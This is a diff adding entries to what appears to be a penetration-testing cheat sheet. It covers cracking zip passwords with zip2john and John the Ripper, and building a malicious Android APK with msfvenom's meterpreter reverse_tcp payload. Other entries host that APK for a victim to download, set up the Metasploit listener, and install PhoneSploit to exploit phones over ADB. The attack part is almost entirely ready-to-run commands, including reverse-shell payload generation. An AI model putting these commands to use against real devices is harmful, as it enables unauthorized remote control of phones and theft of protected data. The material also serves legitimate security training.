@@ -896,7 +896,9 @@ Is a tool for enumerating information from Windows and Samba systems. It is used
 - `chmod 600 privateKey.pem`
 - `ssh -i privateKey.pem user@ip`
 
+> crack .zip pass with hash 
 
+- `zip2john archivo.zip > hashdelzip.hasH`
 
 
 > John The Ripper: Crack the hash
@@ -1954,10 +1956,18 @@ If the domain has different IPs associated with it, it has a balancer.
 ## <span style="color: #3498db; font-size: 0.8em;">  Hack an Android Device by Creating Binary Payloads (create malicious APK)</span>
 
 >  msfvenom
+-  `msfvenom -l payloads | grep android`
 - `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik lhost=IP R > ./backdoor.apk`
+- `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=192.x.x.x  LPORT=4xxx -f raw> dky.apk`
+
+- `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik
+LHOST=10.10.1.13 LPORT=4444 –f raw –o Backdoor.apk`
+
 - `cp /root/Desktop/backdoor.apk /var/www/html/share`
 - `service postgresql start`
 - `use exploit/multi/handler`
+- `set payload android/meterpreter/reverse_tcp`
+
 - In Android:
 	* http://IP/share/ >  download the backdoor.apk > execute it
 
@@ -1988,6 +1998,21 @@ If the domain has different IPs associated with it, it has a balancer.
 
 
 ## <span style="color: #3498db; font-size: 0.8em;">  Exploit Android Platform though ADB</span>
+
+- apt install adb
+- git clone https://github.com/aerosol‐can/PhoneSploit
+- cd PhoneSploit
+- pip3 install colorama
+
+> other form to install 
+
+- apt install adb
+- git clone https://github.com/prbhtkumr/PhoneSploit
+- cd PhoneSploit
+- python3 -m venv myenv
+- source myenv/bin/activate
+- pip3 install colorama
+- python3 phonesploit.py
 
 >  phonesploit
 - cd PhoneSploit
@@ -2031,6 +2056,9 @@ If the domain has different IPs associated with it, it has a balancer.
  >Upload a file
 - `adb push test.apk /sdcard`
 
+>find command 
+
+- `find / -name "*.txt" 2>/dev/null`
 
 ----
 
